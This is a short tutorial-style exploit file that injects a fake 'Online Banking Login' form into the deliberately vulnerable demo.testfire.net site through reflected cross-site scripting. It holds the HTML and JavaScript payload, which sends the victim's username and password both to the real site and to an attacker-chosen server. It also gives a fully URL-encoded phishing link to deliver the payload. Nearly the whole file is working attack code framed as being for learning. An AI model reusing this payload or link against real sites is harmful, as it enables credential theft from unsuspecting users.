# Fake Login page using cross site scripting.
# This is done on a website which is made intentionally vulnerable.
# https://demo.testfire.net/
# This is only for learning purposes.

#Below is the script execute this on any input form eg (Search, feedback).

#you must have local server setup for me its localhost:30000

#<form action method name="login" id="login"><table><tbody><tr><td>Username:</td><td><input type="text" id="uid" name="uid" value="" style="width: 150px;"></td><td></td></tr><tr><td>Password:</td><td><input type="password" id="passw" name="passw" style="width: 150px;"></td></tr><tr><td></td><td><input type="button" name="btnSubmit" value="Login" onclick="return (SubmitForm());"></td></tr></tbody></table></form>
<script type="text/javascript">
    function SubmitForm()
    {
            document.forms['login'].action='doLogin'; // Login orignal server
            document.forms["login"].method = "post";
            document.forms["login"].target = "_self";
            document.forms["login"].submit();

            document.forms["login"].action = "http://localhost:3000"; // Local server of choice
            document.forms["login"].method = "get";
            document.forms["login"].target = "http://localhost:3000";
            document.forms["login"].submit();
            return (true);
    }
    document.getElementsByClassName("fl")[0].children[0].textContent = "Online Banking Login";
    document.getElementsByClassName("fl")[0].children[1].textContent = "";            
</script>

# Below is the link prepared from the above script.

# <a href="https://demo.testfire.net/search.jsp?query=%3Cform+action+method+name%3D%22login%22+id%3D%22login%22%3E%3Ctable%3E%3Ctbody%3E%3Ctr%3E%3Ctd%3EUsername%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22text%22+id%3D%22uid%22+name%3D%22uid%22+value%3D%22%22+style%3D%22width%3A+150px%3B%22%3E%3C%2Ftd%3E%3Ctd%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3EPassword%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22password%22+id%3D%22passw%22+name%3D%22passw%22+style%3D%22width%3A+150px%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3E%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22button%22+name%3D%22btnSubmit%22+value%3D%22Login%22+onclick%3D%22return+%28SubmitForm%28%29%29%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftbody%3E%3C%2Ftable%3E%3C%2Fform%3E+%3Cscript+type%3D%22text%2Fjavascript%22%3E+++++function+SubmitForm%28%29+++++%7B+++++++++++++document.forms%5B%27login%27%5D.action%3D%27doLogin%27%3B+++++++++++++document.forms%5B%22login%22%5D.method+%3D+%22post%22%3B+++++++++++++document.forms%5B%22login%22%5D.target+%3D+%22_self%22%3B+++++++++++++document.forms%5B%22login%22%5D.submit%28%29%3B++++++++++++++document.forms%5B%22login%22%5D.action+%3D+%22http%3A%2F%2Flocalhost%3A3000%22%3B+++++++++++++document.forms%5B%22login%22%5D.method+%3D+%22get%22%3B+++++++++++++document.forms%5B%22login%22%5D.target+%3D+%22http%3A%2F%2Flocalhost%3A3000%22%3B+++++++++++++document.forms%5B%22login%22%5D.submit%28%29%3B+++++++++++++return+%28true%29%3B+++++%7D+++++document.getElementsByClassName%28%22fl%22%29%5B0%5D.children%5B0%5D.textContent+%3D+%22Online+Banking+Login%22%3B+++++document.getElementsByClassName%28%22fl%22%29%5B0%5D.children%5B1%5D.textContent+%3D+%22%22%3B+++++++++++++%3C%2Fscript%3E" target="_blank">Click me to fake login</a>


#References
#https://pentest-tools.com/blog/xss-attacks-practical-scenarios/
#http://form.guide/web-form/submit-form-multiple-scripts.html
